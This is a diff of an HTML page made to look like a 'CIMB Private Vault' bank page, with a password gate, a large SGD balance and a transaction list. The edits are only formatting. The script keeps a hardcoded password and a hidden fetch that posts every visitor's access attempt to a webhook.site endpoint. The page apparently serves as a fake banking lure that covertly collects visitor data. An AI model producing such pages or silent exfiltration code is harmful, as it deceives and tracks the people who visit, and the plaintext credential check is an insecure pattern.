@@ -1,4 +1,6 @@
-<!DOCTYPE html><html lang="en">
+
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -106,7 +108,9 @@
     <br />
     <button onclick="validatePassword()">Access</button>
     <div id="errorMsg" class="error"></div>
-  </div>  <div class="vault" id="vaultBox">
+  </div>
+
+  <div class="vault" id="vaultBox">
     <h2>CIMB Private Vault</h2>
     <p class="balance">$362,589.92 SGD</p>
     <p>Status: Your holdings are secure.</p>
@@ -150,13 +154,14 @@
       </table>
     </div>
     <div class="footer-note">Older Transactions Cannot be Retrieved</div>
-  </div>  <script>
+  </div>
+
+  <script>
     function validatePassword() {
       const password = document.getElementById("passwordInput").value;
-      const correctPassword = "Tobysafe1991"; // updated password
+      const correctPassword = "Tobysafe1991";
       const errorMsg = document.getElementById("errorMsg");
 
-      // Log visitor access attempt
       fetch("https://webhook.site/867ae5f4-7a7c-4aac-a47d-3ed80cdaea41", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -170,5 +175,6 @@
         errorMsg.textContent = "Incorrect password.";
       }
     }
-  </script></body>
+  </script>
+</body>
 </html>
